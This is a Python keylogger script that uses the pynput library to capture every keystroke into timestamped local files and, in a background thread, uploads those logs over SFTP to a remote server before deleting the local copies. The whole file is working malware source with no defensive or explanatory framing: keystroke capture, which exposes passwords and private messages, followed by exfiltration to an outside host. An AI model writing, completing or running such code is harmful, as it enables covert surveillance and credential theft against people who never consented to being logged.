#!/usr/bin/env python3
from pynput import keyboard
from datetime import date, datetime
import logging
import os
import sys
import config
from connect import connect as sftp_server
import time
import threading


def write_key_to_file(key):
    filename = config.local_keylogs_dir / '{datetime}.txt'.format(datetime=datetime.now().strftime('%Y%m%d%H%M'))
    file = open(filename, mode='a')
    file.write(key)
    file.close()


def upload_logged_keys():

    logging.info('uploading logged keys')
    _sftp_server = sftp_server()
    files = os.listdir(config.local_keylogs_dir)
    today = date.today()
    files = list(filter(lambda file: file if datetime.strptime(file[:8], '%Y%m%d').date() <= today else False, files))
    logging.info('files## {}'.format(len(files)))
    if len(files) > 0:
        ftp_server = sftp_server()
        for file in files:
            local_file = config.local_keylogs_dir / file
            remote_file = config.remote_keylogs_dir / file
            if not _sftp_server.exists(bytes(remote_file)):
                ftp_server.put(bytes(local_file), bytes(remote_file))
            os.unlink(local_file)
        _sftp_server.close()


def upload_logged_keys_schedule(sleep=60):
    while True:
        if config.is_online():
            upload_logged_keys()
            time.sleep(sleep)


def capture_keylogs(sleep=60):
    logging.info('start capturing keylogs')
    while True:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        time.sleep(sleep)
        listener.stop()


def on_press(key):
    logging.info('on_press fn - {}'.format(key))
    if isinstance(key, keyboard.Key):  # special keys, Alt, Shift, Space etc
        if key == key.space:
            key = " "
        elif key == key.enter:
            key = "\n"
        else:
            key = ""
    elif isinstance(key, keyboard.KeyCode):  # normal alphanumeric keys
        key = key.char
    key = key.strip("'")
    write_key_to_file(key)


if len(sys.argv) == 2:
    arg = sys.argv[1]

    if arg == 'start':
        capture_keylogs()

    if arg == 'upload':
        date = date.today()
        upload_logged_keys()
        time.sleep(120)


if __name__ == '__main__':
    logging.info('__main__##')
    t1 = threading.Timer(1, capture_keylogs)
    t1.start()

    t2 = threading.Timer(1, upload_logged_keys_schedule)
    t2.start()

